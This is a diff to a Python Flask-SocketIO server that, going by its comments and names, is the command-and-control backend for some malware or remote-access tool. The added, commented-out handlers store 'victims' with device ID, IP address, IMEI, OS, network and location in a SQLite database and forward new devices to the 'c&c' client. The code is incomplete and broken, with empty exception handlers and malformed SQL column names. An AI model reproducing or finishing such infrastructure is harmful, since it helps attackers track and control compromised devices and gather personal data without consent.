@@ -9,23 +9,78 @@ app = Flask(__name__)
 app.secret_key = 'the rastafarian in you'
 socketio = SocketIO(app)
 
+# @socketio.on
+# def connect():
+#     try:
+#         con = sqlite3.connect("database.db")
+#         cur = con.cursor()
+#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
+#         record = cur.fetchall()
+#         con.close()
+#         # emit to c&c id
+#         if record.__len__() != 0:
+#             emit("victims", record)
+#         else:
+#             emit("victims", None)
+#     except sqlite3.Error as error:
+#         # do something
 
-@socketio.on("pong")
-def reply(msg):
-    print(msg)
-    socketio.emit("response", "mesaage ")
 
-def get_ccid():
-    ccid = ""
-    with open("ccid.txt", "r") as id:
-        ccid = id.read()
-    return ccid
+# @socketio.on("fetch_victim")
+# def fetch_victim_details(id):
+#     try:
+#         con = sqlite3.connect("database.db")
+#         cur = con.cursor()
+#         cur.execute("SELECT * FROM victim WHERE client-id= ?", (id,))
+#         record = cur.fetchall()
+#         con.close()
+#         emit("add_victim", record)
+#     except sqlite3.Error as error:
+#         # do something
 
-@socketio.on("connect")
-def connection_established(ccid):
-    with open("ccid.txt", "w+") as id_manager:
-        id_manager.write(ccid)
-    socketio.emit("connection_status", "connected")
+
+# @socketio.on("victim_connect")
+# def victim_connect(details):
+#     try:
+#         con = sqlite3.connect("database.db")
+#         cur = con.cursor()
+#         cur.execute(
+#             "INSERT INTO victim(device-id, client-id, ip-address, imei, os, network, location) VALUES(?, ?, ?, ?, ?, ?, ?)",
+#             (
+#                 details['device-id'],
+#                 details['client-id'],
+#                 details['ip-address'],
+#                 details['imei'],
+#                 details['os'],
+#                 details['network'],
+#                 details['location'],
+#             )
+#         )
+#         con.commit()
+#         con.close()
+#         # emit to c&c
+#         emit("new_device", "device id")
+#     except sqlite3.Error as error:
+#         # do something
+
+# @socketio.on("pong")
+# def reply(msg):
+#     print(msg)
+
+# def get_ccid():
+#     ccid = ""
+#     with open("ccid.txt", "r") as id:
+#         ccid = id.read()
+#     return ccid
+
+# @socketio.on("connect")
+# def connection_established(ccid):
+#     with open("ccid.txt", "w+") as id_manager:
+#         id_manager.write(ccid)
+#     socketio.emit("connection_status", "connected")
+
+
+
 
 @app.route("/", methods=['GET'])
 def index():
